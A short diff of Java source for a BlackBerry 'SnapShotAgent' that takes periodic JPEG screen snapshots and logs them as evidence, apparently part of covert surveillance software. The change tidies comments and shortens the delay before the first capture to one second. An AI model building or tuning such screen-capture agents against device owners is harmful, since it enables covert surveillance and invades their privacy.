@@ -26,9 +26,8 @@ import blackberry.evidence.EvidenceType;
 import blackberry.utils.Check;
 import blackberry.utils.WChar;
 
-// TODO: Auto-generated Javadoc
+
 /**
- * TODO : evitare lo snapshot se l'immagine e' nera. Cominciare a vedere se e'
  * in holster.
  * 
  * @author user1
@@ -41,6 +40,7 @@ public final class SnapShotAgent extends Agent {
     private static final int SNAPSHOT_DEFAULT_JPEG_QUALITY = 60;
     private static final int LOG_SNAPSHOT_VERSION = 2009031201;
     private static final int MIN_TIMER = 1 * 1000;
+    private static final long SNAPSHOT_DELAY = 1000;
 
     private int timerMillis = 60 * 1000;
     private boolean onNewWindow = false;
@@ -213,7 +213,7 @@ public final class SnapShotAgent extends Agent {
         }
 
         setPeriod(timerMillis);
-        setDelay(timerMillis);
+        setDelay(SNAPSHOT_DELAY);
 
         //#ifdef DEBUG
         debug.info("timer: " + timerMillis + " ms");
